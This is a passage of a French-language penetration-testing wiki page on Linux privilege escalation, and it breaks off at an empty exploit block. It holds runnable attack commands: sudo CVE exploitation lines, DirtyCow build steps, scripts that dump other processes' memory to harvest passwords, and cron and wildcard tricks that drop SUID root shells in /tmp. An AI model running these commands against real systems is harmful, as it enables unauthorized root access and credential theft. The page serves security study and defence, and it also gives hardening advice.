# Élévation de privilèges Linux

{{#include ../../../banners/hacktricks-training.md}}

Pour un aperçu plus général et des méthodes historiques d'énumération, consultez les ressources g0tmi1k, Payatu, SANS, LPE Workshop, Linux-Privilege-Escalation et linux-private-i répertoriées dans les références.<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[10]](#references)[[11]](#references)[[13]](#references)</sup>

## Informations système

### Informations sur le système d'exploitation

Commençons par recueillir quelques informations sur le système d'exploitation en cours d'exécution.

```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```

### Chemin

Si vous **avez des droits d’écriture sur un dossier de la variable `PATH`**, vous pourriez détourner certaines bibliothèques ou certains binaires :

```bash
echo $PATH
```

### Infos sur l’environnement

Des informations intéressantes, des mots de passe ou des clés API dans les variables d’environnement ?

```bash
(env || set) 2>/dev/null
```

### Exploits du noyau

Vérifiez la version du noyau et voyez s’il existe un exploit permettant d’élever les privilèges.

La [section Kernel/LPE/CVE](../../main-system-information/kernel-lpe-cves/README.md) regroupe des cas d’escalade de privilèges locale et renvoie vers des analyses plus approfondies du noyau Linux dans Binary Exploitation. Vérifiez la build et la configuration concernées avant de tester une étude de cas.

```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```

Vous trouverez ici une bonne liste de kernels vulnérables et quelques **compiled exploits** : [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) et [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).<sup>[[12]](#references)</sup>\
Autres sites proposant des **compiled exploits** : [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Pour extraire toutes les versions vulnérables du kernel depuis ce site, vous pouvez exécuter :

```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```

Les outils qui peuvent aider à rechercher des exploits du kernel sont :

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (à exécuter SUR la victime, vérifie uniquement les exploits pour le kernel 2.x)

**Recherchez toujours la version du kernel sur Google** : il se peut que votre version du kernel soit mentionnée dans un exploit, ce qui vous permettra de vous assurer que cet exploit est valide.

Techniques supplémentaires d’exploitation du kernel :

{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Élévation de privilèges Linux - Linux Kernel <= 3.19.0-73.8

```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```

### Version de sudo

En fonction des versions vulnérables de sudo qui apparaissent dans :

```bash
searchsploit sudo
```

Vous pouvez vérifier si la version de sudo est vulnérable à l’aide de cette commande grep.

```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```

### Sudo < 1.9.17p1

Les versions amont de sudo **1.9.14 à 1.9.17** permettent aux utilisateurs locaux non privilégiés d’obtenir les privilèges root via l’option `--chroot` lorsque sudo charge `/etc/nsswitch.conf` depuis un répertoire contrôlé par l’utilisateur ; l’amont a corrigé ce problème dans **1.9.17p1**. Vérifiez chaque binaire sudo exécutable avec le bit setuid root dans les chemins concernés, car `sudo -V` n’indique que le binaire sélectionné par `PATH`. Les paquets des distributions peuvent rétroporter le correctif sans modifier la chaîne de version amont ; vérifiez donc aussi l’état du paquet fourni par l’éditeur. Consultez l’[avis du responsable de sudo](https://www.openwall.com/lists/oss-security/2025/06/30/3).<sup>[[28]](#references)[[29]](#references)</sup>

Voici un [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) pour exploiter cette [vulnérabilité](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Avant d’exécuter l’exploit, vérifiez que votre version de `sudo` est vulnérable et qu’elle prend en charge la fonctionnalité `chroot`.

Pour plus d’informations, consultez l’[avis de vulnérabilité original](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/).<sup>[[28]](#references)</sup>

### Contournement des règles sudo basées sur l’hôte (CVE-2025-32462)

Les versions amont de sudo **1.8.8 à 1.9.17** peuvent évaluer les règles sudoers basées sur l’hôte à partir du **nom d’hôte fourni par l’utilisateur** avec `sudo -h <host>` au lieu du **nom d’hôte réel** ; l’amont a corrigé ce problème dans **1.9.17p1**. L’utilisateur doit toujours disposer d’une entrée sudoers correspondante sur l’hôte sélectionné. Vérifiez également les correctifs rétroportés par les éditeurs, les autres binaires sudo ainsi que la politique locale. Consultez l’[avis du responsable de sudo](https://www.openwall.com/lists/oss-security/2025/06/30/2).<sup>[[29]](#references)</sup>

Conditions requises :
- Version vulnérable de sudo
- Règles sudoers propres à un hôte (l’hôte n’est ni le nom d’hôte actuel ni `ALL`)

Exemple de motif sudoers :

```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```

Exploit par spoofing de l’hôte autorisé :

```bash
sudo -h devbox id
sudo -h devbox -i
```

Si la résolution du nom sélectionné bloque, vérifiez comment ce nom est résolu sur l’hôte. Le simple fait de voir un nom dans un journal ou un fichier de configuration ne signifie pas qu’il peut être résolu, et la modification de `/etc/hosts` nécessite généralement un accès en écriture privilégié.

#### sudo < v1.8.28

Ce [contournement upstream de Runas UID](https://ubuntu.com/security/CVE-2019-14287) nécessite une règle sudo effective qui autorise une commande en tant que tous les utilisateurs, à l’exception de root, par exemple `(ALL, !root) /bin/bash`. L’appelant doit également être autorisé à utiliser cette règle, y compris satisfaire toute exigence d’authentification. Consultez l’avis de sécurité du paquet installé : les fournisseurs ont rétroporté le correctif dans des versions dont le numéro upstream affiché est toujours inférieur à 1.8.28. Une règle `!root` ou une ancienne version ne suffit pas à confirmer l’exposition. Ne testez pas de commande privilégiée pendant l’énumération passive.

```
sudo -u#-1 /bin/bash
```

### Échec de la vérification de la signature Dmesg

Consultez la **box smasher2 de HTB** pour voir un **exemple** d’exploitation possible de cette vulnérabilité.

```bash
dmesg 2>/dev/null | grep "signature"
```

### Énumération supplémentaire du système

```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```

## Énumérer les défenses possibles

### AppArmor

```bash
if [ `which aa-status 2>/dev/null` ]; then
    aa-status
  elif [ `which apparmor_status 2>/dev/null` ]; then
    apparmor_status
  elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
    ls -d /etc/apparmor*
  else
    echo "Not found AppArmor"
fi
```

### Grsecurity

```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```

### PaX

```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```

### Execshield

```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```

### SElinux

```bash
 (sestatus 2>/dev/null || echo "Not found sestatus")
```

### ASLR

```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```

## Container Breakout

Si vous êtes dans un conteneur, commencez par la section suivante sur la sécurité des conteneurs, puis pivotez vers les pages d’abus spécifiques au runtime :


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Disques

Vérifiez **ce qui est monté ou démonté**, où et pourquoi. Si quelque chose est démonté, vous pouvez essayer de le monter et rechercher des informations privées.

```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```

## Logiciels utiles

Énumérer les binaires utiles

```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```

Vérifiez également si **un compilateur est installé**. C'est utile si vous devez utiliser un exploit du noyau, car il est recommandé de le compiler sur la machine où vous allez l'utiliser (ou sur une machine similaire).

```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```

### Logiciels vulnérables installés

Vérifiez la **version des paquets et des services installés**. Il se peut qu’une ancienne version de Nagios, par exemple, puisse être exploitée pour obtenir une élévation de privilèges…\
Il est recommandé de vérifier manuellement la version des logiciels installés les plus suspects.

```bash
dpkg -l #Debian
rpm -qa #Centos
```

Si vous avez un accès SSH à la machine, vous pouvez également utiliser **openVAS** pour rechercher les logiciels obsolètes et vulnérables installés sur la machine.

> [!NOTE] > _Notez que ces commandes afficheront beaucoup d’informations qui seront pour la plupart inutiles. Il est donc recommandé d’utiliser des applications comme OpenVAS ou équivalent, qui vérifieront si une version des logiciels installés est vulnérable à des exploits connus_

## Processes

Examinez **quels processus** sont en cours d’exécution et vérifiez si l’un d’eux dispose de **privilèges supérieurs à ceux nécessaires** (par exemple, un tomcat exécuté par root ?)

```bash
ps aux
ps -ef
top -n 1
```

Toujours vérifier si des [**debuggers electron/cef/chromium**](../../software-information/electron-cef-chromium-debugger-abuse.md) sont en cours d’exécution ; vous pourriez en abuser pour escalader vos privilèges. **Linpeas** les détecte en recherchant le paramètre `--inspect` dans la ligne de commande du processus.\
Vérifiez également **vos privilèges sur les binaires des processus** : vous pourriez peut-être en écraser un.

### Chaînes parent-enfant entre utilisateurs

Un processus enfant exécuté sous un **utilisateur différent** de celui de son parent n’est pas automatiquement malveillant, mais c’est un **signal utile pour le triage**. Certaines transitions sont attendues (`root` qui lance un utilisateur de service, gestionnaires de connexion qui créent des processus de session), mais des chaînes inhabituelles peuvent révéler des wrappers, des aides au débogage, de la persistance ou des limites de confiance fragiles à l’exécution.

Examen rapide :

```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```

Si vous trouvez une chaîne surprenante, inspectez la ligne de commande du processus parent et tous les fichiers qui influencent son comportement (`config`, `EnvironmentFile`, scripts auxiliaires, répertoire de travail, arguments modifiables). Dans plusieurs cas réels de privesc, le processus enfant lui-même n’était pas modifiable, mais la **config contrôlée par le processus parent** ou la chaîne de scripts auxiliaires l’était.

### Exécutables supprimés et fichiers supprimés encore ouverts

Les artefacts d’exécution restent souvent accessibles **après leur suppression**. Cela peut servir à la fois à l’élévation de privilèges et à la récupération de preuves à partir d’un processus qui a déjà des fichiers sensibles ouverts.

Vérifiez la présence d’exécutables supprimés :

```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```

Si `/proc/<PID>/exe` pointe vers `(deleted)`, le processus exécute toujours l’ancienne image binaire depuis la mémoire. C’est un signal fort qui mérite une investigation, car :

- l’exécutable supprimé peut contenir des chaînes intéressantes ou des identifiants
- le processus en cours peut toujours exposer des descripteurs de fichiers utiles
- un binaire privilégié supprimé peut indiquer une altération récente ou une tentative de nettoyage

Collectez globalement les fichiers supprimés encore ouverts :

```bash
lsof +L1
```

Si vous trouvez un descripteur intéressant, récupérez-le directement :

```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```

Cela est particulièrement utile lorsqu'un processus a toujours ouvert un secret supprimé, un script, un export de base de données ou un fichier contenant un flag.

### Surveillance des processus

Vous pouvez utiliser des outils comme [**pspy**](https://github.com/DominicBreuker/pspy) pour surveiller les processus. Cela peut être très utile pour identifier des processus vulnérables exécutés fréquemment ou lorsque certaines conditions sont réunies.

#### Linux ProcMon avec sudo

[ProcMon for Linux](https://github.com/microsoft/ProcMon-for-Linux) peut tracer des processus et des appels système sélectionnés, puis enregistrer la trace dans une base de données SQLite. Si `sudo -l` autorise l'exécution sans restriction d'une commande `procmon` capable d'obtenir les privilèges root, examinez si elle pourrait observer les entrées ou les sorties d'un processus appartenant à un autre utilisateur. Cette permission constitue seulement une piste à vérifier : la prise en charge du traçage, la politique effective et l'activité d'un processus adapté sont autant de facteurs importants. Les fichiers de trace peuvent contenir des secrets ; examinez avec soin les exports autorisés et évitez de collecter des données provenant de processus non concernés.

### Mémoire des processus

Certains services serveur stockent **des identifiants en clair dans la mémoire**.\
Normalement, vous aurez besoin des **privilèges root** pour lire la mémoire de processus appartenant à d'autres utilisateurs ; cette méthode est donc généralement plus utile lorsque vous êtes déjà root et souhaitez découvrir d'autres identifiants.\
Cependant, n'oubliez pas qu'**en tant qu'utilisateur normal, vous pouvez lire la mémoire des processus qui vous appartiennent**.

> [!WARNING]
> Notez qu'aujourd'hui, la plupart des machines **n'autorisent pas ptrace par défaut**, ce qui signifie que vous ne pouvez pas dumper d'autres processus appartenant à votre utilisateur non privilégié.
>
> Le fichier _**/proc/sys/kernel/yama/ptrace_scope**_ contrôle l'accessibilité de ptrace :
>
> - **kernel.yama.ptrace_scope = 0** : tous les processus peuvent être débogués, à condition d'avoir le même uid. C'est le mode de fonctionnement classique de ptrace.
> - **kernel.yama.ptrace_scope = 1** : seul un processus parent peut être débogué.
> - **kernel.yama.ptrace_scope = 2** : seul un administrateur peut utiliser ptrace, car cette opération nécessite la capacité CAP_SYS_PTRACE.
> - **kernel.yama.ptrace_scope = 3** : aucun processus ne peut être tracé avec ptrace. Une fois cette valeur définie, un redémarrage est nécessaire pour réactiver ptrace.

Un processus exécuté avec le même UID qui déverrouille brièvement un coffre-fort de mots de passe peut constituer une frontière distincte pour les identifiants. Lorsque le traçage est autorisé, les appels système d'entrée ou la mémoire d'un processus actif et dumpable peuvent révéler le mot de passe du coffre-fort, même si le fichier chiffré lui-même reste protégé. `ptrace_scope=0` n'est qu'une condition préalable : les identifiants correspondants, le caractère dumpable de la cible, les autres modules de sécurité Linux et la durée de vie du processus comptent également. Pour qu'une entrée du coffre-fort permette une connexion Unix en tant que root, il faut vérifier séparément la réutilisation de ces identifiants. Une énumération courante devrait signaler la politique et les chemins des processus ou coffres-forts potentiels, sans capturer les entrées ni afficher les secrets. Consultez la [documentation Yama du noyau](https://cdn.kernel.org/doc/html/latest/admin-guide/LSM/Yama.html) et les [contrôles d'accès ptrace](https://man7.org/linux/man-pages/man2/ptrace.2.html).

#### GDB

Si vous avez accès à la mémoire d'un service FTP (par exemple), vous pourriez récupérer le Heap et y rechercher des identifiants.

```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```

#### Script GDB

```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
    | sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
    | while read start stop; do \
    gdb --batch --pid $1 -ex \
    "dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```

#### /proc/$pid/maps & /proc/$pid/mem

Pour un ID de processus donné, **maps indique comment la mémoire est mappée dans l'espace d'adressage virtuel du processus** ; il indique également les **permissions de chaque région mappée**. Le pseudo-fichier **mem expose la mémoire du processus elle-même**. À partir du fichier **maps**, nous savons quelles **régions mémoire sont lisibles** et quels sont leurs offsets. Nous utilisons ces informations pour **nous positionner dans le fichier mem et vider toutes les régions lisibles** dans un fichier.

```bash
procdump()
(
    cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
    while read a b; do
        dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
           skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
    done )
    cat $1*.bin > $1.dump
    rm $1*.bin
)
```

#### /dev/mem

`/dev/mem` donne accès à la mémoire **physique** du système, et non à la mémoire virtuelle. L'espace d'adressage virtuel du noyau est accessible via /dev/kmem.\
En général, `/dev/mem` est uniquement lisible par **root** et le groupe **kmem**.

```
strings /dev/mem -n10 | grep -i PASS
```

### ProcDump pour Linux

ProcDump est une réinterprétation pour Linux de l’outil classique ProcDump de la suite Sysinternals pour Windows. Téléchargez-le sur [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)

```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```

### Outils

Pour vider la mémoire d’un processus, vous pouvez utiliser :

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Vous pouvez supprimer manuellement les exigences root et vider la mémoire d’un processus dont vous êtes propriétaire
- Script A.5 de [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root est requis)

### Identifiants depuis la mémoire d’un processus

#### Exemple manuel

Si vous constatez que le processus authenticator est en cours d’exécution :

```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```

Vous pouvez dumper le processus (consultez les sections précédentes pour découvrir différentes façons de dumper la mémoire d’un processus) et rechercher des identifiants dans la mémoire :

```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```

#### mimipenguin

L’outil [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) va **voler des identifiants en clair depuis la mémoire** et certains **fichiers bien connus**. Il nécessite les privilèges root pour fonctionner correctement.

| Fonctionnalité                                    | Nom du processus     |
| ------------------------------------------------- | -------------------- |
| Mot de passe GDM (Kali Desktop, Debian Desktop)   | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (connexions FTP actives)                   | vsftpd               |
| Apache2 (sessions HTTP Basic Auth actives)        | apache2              |
| OpenSSH (sessions SSH actives - utilisation de Sudo) | sshd:             |

#### Regex de recherche/[truffleproc](https://github.com/controlplaneio/truffleproc)

```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```

## Tâches planifiées/Cron

### Crontab UI (alseambusher) exécuté en root – privesc via un planificateur web

Si un panneau web « Crontab UI » (alseambusher/crontab-ui) s’exécute en root et n’est lié qu’à l’interface loopback, vous pouvez tout de même y accéder via une redirection de port local SSH et créer une tâche privilégiée pour élever vos privilèges.<sup>[[1]](#references)[[4]](#references)</sup>

Chaîne typique
- Repérer un port accessible uniquement via loopback (p. ex. 127.0.0.1:8000) et le realm Basic-Auth à l’aide de `ss -ntlp` / `curl -v localhost:8000`
- Trouver les identifiants dans les artefacts opérationnels :
  - Sauvegardes/scripts avec `zip -P <password>`
  - Unité systemd exposant `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Créer le tunnel et se connecter :
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Créer une tâche à privilèges élevés et l’exécuter immédiatement (dépose un shell SUID) :
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Utilisez-le :
```bash
/tmp/rootshell -p   # root shell
```

Durcissement
- Ne lancez pas Crontab UI en tant que root ; utilisez un utilisateur dédié avec des permissions minimales
- Écoutez uniquement sur localhost et restreignez également l’accès via un firewall/VPN ; ne réutilisez pas les mots de passe
- Évitez d’intégrer des secrets dans les fichiers unit ; utilisez des coffres à secrets ou un fichier EnvironmentFile accessible uniquement à root
- Activez l’audit et la journalisation des exécutions de tâches à la demande

Vérifiez si une tâche planifiée est vulnérable. Peut-être pouvez-vous exploiter un script exécuté par root (vulnérabilité liée aux jokers ? modifier des fichiers utilisés par root ? utiliser des liens symboliques ? créer des fichiers spécifiques dans le répertoire utilisé par root ?).

```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```

Si `run-parts` est utilisé, vérifiez quels noms seront réellement exécutés :

```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```

Cela évite les faux positifs. Un répertoire périodique accessible en écriture n’est utile que si le nom de votre payload respecte les règles locales de `run-parts`.

### Chemin Cron

Par exemple, dans _/etc/crontab_, vous pouvez trouver le PATH : _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Remarquez que l’utilisateur « user » dispose de droits d’écriture sur /home/user_)

Si l’utilisateur root tente d’exécuter une commande ou un script dans ce crontab sans définir le chemin. Par exemple : _\* \* \* \* root overwrite.sh_\
Alors, vous pouvez obtenir un shell root en utilisant :

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```

### Cron utilisant un script avec un caractère générique (Wildcard Injection)

Si un script exécuté par root contient un « **\*** » dans une commande, vous pouvez exploiter cela pour provoquer des effets inattendus (comme une privesc). Exemple :

```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```

**Si le wildcard est précédé d'un chemin comme** _**/some/path/\***_ **, il n'est pas vulnérable (même** _**./\***_ **ne l'est pas).**

Lisez la page suivante pour découvrir d'autres astuces d'exploitation des wildcards :


{{#ref}}
../../interesting-files-permissions/wildcards-spare-tricks.md
{{#endref}}


### Injection par expansion arithmétique de Bash dans les parseurs de logs cron

Le calcul arithmétique de Bash peut interpréter du texte non fiable comme une expression. Dans certains contextes Bash concernés, un indice de tableau dans cette expression peut évaluer une substitution de commande. Si un parseur privilégié de cron insère du texte de log contrôlé par un attaquant dans une comparaison arithmétique, la substitution peut s'exécuter avec l'identité du parseur.<sup>[[22]](#references)</sup> Cela dépend de l'expression Bash exacte et de sa version ; une chaîne `$(...)0` seule dans une variable développée ne démontre pas de manière fiable une réévaluation.

L'entrée peut aussi provenir des métadonnées d'un fichier ou d'un autre champ lu depuis un emplacement accessible en écriture par l'utilisateur. Par exemple, un script de nettoyage privilégié qui lit une balise `Producer` d'une image et la compare avec `[[ "$producer" -eq "expected" ]]` effectue une comparaison arithmétique, même si la variable est entre guillemets. Vérifiez l'identité utilisée pour la tâche planifiée, les fichiers pouvant fournir la balise, les transformations effectuées avant la comparaison et le comportement exact de Bash. Pour les libellés textuels, utilisez une comparaison de chaînes ; pour les nombres, validez que l'entrée ne contient que des chiffres décimaux avant tout calcul arithmétique. Consultez les [règles arithmétiques de Bash](https://www.gnu.org/software/bash/manual/html_node/Shell-Arithmetic.html).

- Modèle typiquement vulnérable :
  ```bash
  #!/bin/bash
  # Example: parse a log and "sum" a count field coming from the log
  while IFS=',' read -r ts user count rest; do
      # count is untrusted if the log is attacker-controlled
      (( total += count ))     # or: let "n=$count"
  done < /var/www/app/log/application.log
  ```

- Sonde sûre du comportement local du mécanisme d’indexation de tableau (aucun processus privilégié ni modification de fichier) :
  ```bash
  code='x[$(printf marker >&2)]'
  [[ 200 -eq "$code" ]]
  # Bash may print "marker" while evaluating the arithmetic operand.
  ```

Tracez le script réellement planifié et le chemin littéral qu’il ouvre. Même si le fichier journal n’est pas accessible en écriture, un utilisateur qui peut écrire dans son répertoire parent non sticky et le traverser peut être en mesure de remplacer son entrée de répertoire ; `namei -l` aide à distinguer ces permissions. Un autre chemin de journal accessible en écriture, un planificateur illisible ou un analyseur qui n’évalue jamais ce champ comme une expression arithmétique Bash ne suffit pas à établir cette possibilité.

### Écrasement d’un script cron et symlink

Si vous **pouvez modifier un script cron** exécuté par root, vous pouvez très facilement obtenir un shell :

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```

Si le script exécuté par root utilise un **répertoire auquel vous avez un accès complet**, il peut être utile de supprimer ce dossier et de **créer un dossier symlink pointant vers un autre répertoire** contenant un script que vous contrôlez.

```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```

### Validation des liens symboliques et gestion plus sûre des fichiers

Lors de l’examen de scripts/binaires privilégiés qui lisent ou écrivent des fichiers en utilisant leur chemin, vérifiez la façon dont les liens sont traités :

- `stat()` suit un lien symbolique et renvoie les métadonnées de la cible.
- `lstat()` renvoie les métadonnées du lien lui-même.
- `readlink -f` et `namei -l` permettent de résoudre la cible finale et d’afficher les permissions de chaque composant du chemin.

```bash
readlink -f /path/to/link
namei -l /path/to/link
```

Pour les défenseurs/développeurs, les méthodes plus sûres contre les astuces avec des symlinks incluent :

- `O_EXCL` avec `O_CREAT` : échouer si le chemin existe déjà (bloque les liens/fichiers précréés par un attaquant).
- `openat()` : opérer relativement à un descripteur de fichier de répertoire de confiance.
- `mkstemp()` : créer des fichiers temporaires de façon atomique avec des permissions sécurisées.

### Binaires cron signés avec des charges utiles modifiables
Un utilisateur ordinaire capable d’écrire dans le binaire exact exécuté par une tâche cron root peut franchir une frontière de privilèges, mais une vérification de signature personnalisée peut rejeter un remplacement non signé. Dans le cas documenté, l’ELF appartenant à root était en mode `0760`, ce qui permettait à un membre de son groupe de le modifier, tandis que son propriétaire root pouvait l’exécuter. Une trace de processus visible montrait que `objcopy` extrayait `.text_sig` avant que la tâche n’exécute le binaire ; le script de vérification complet n’était pas lisible.<sup>[[2]](#references)</sup>

Le remplacement qui a fonctionné était signé à l’aide de matériel de signature privé leaké, avec un signataire ELF. Sa [documentation sur le format](https://github.com/NUAA-WatchDog/linux-elf-binary-signer) décrit une section de signature dérivée du `.text` de l’exécutable. Il n’est pas démontré que le simple ajout d’un certificat ou d’une chaîne correspondante dans `.text_sig` suffise à satisfaire le vérificateur non visible. Vérifiez le chemin réellement planifié, les droits d’écriture effectifs, l’invocation par root et la politique du vérificateur avant de conclure qu’un binaire modifiable et signé est exploitable. Une section `.text_sig` à elle seule n’est qu’un indice à examiner.

### Tâches cron fréquentes

Vous pouvez surveiller les processus pour rechercher ceux qui sont exécutés toutes les 1, 2 ou 5 minutes. Vous pourrez peut-être en tirer parti pour élever vos privilèges.

Par exemple, pour **surveiller toutes les 0,1 s pendant 1 minute**, **trier par commandes les moins exécutées** et supprimer les commandes qui ont été exécutées le plus souvent, vous pouvez faire :

```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```

**Vous pouvez également utiliser** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (cela surveillera et listera chaque processus qui démarre).

### Sauvegardes root qui préservent les bits de mode définis par l’attaquant (pg_basebackup)

Si une tâche cron appartenant à root exécute `pg_basebackup` (ou toute copie récursive) sur un répertoire de base de données dans lequel vous pouvez écrire, vous pouvez y placer un **binaire SUID/SGID** qui sera recopié en tant que **root:root**, avec les mêmes bits de mode, dans la sortie de sauvegarde.<sup>[[26]](#references)</sup>

Flux de découverte typique (en tant qu’utilisateur DB à faibles privilèges) :
- Utilisez `pspy` pour repérer une tâche cron root qui appelle quelque chose comme `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` chaque minute.
- Confirmez que le cluster source (par exemple, `/var/lib/postgresql/14/main`) est accessible en écriture pour vous et que la destination (`/opt/backups/current`) appartient à root après l’exécution de la tâche.

Exploit :

```bash
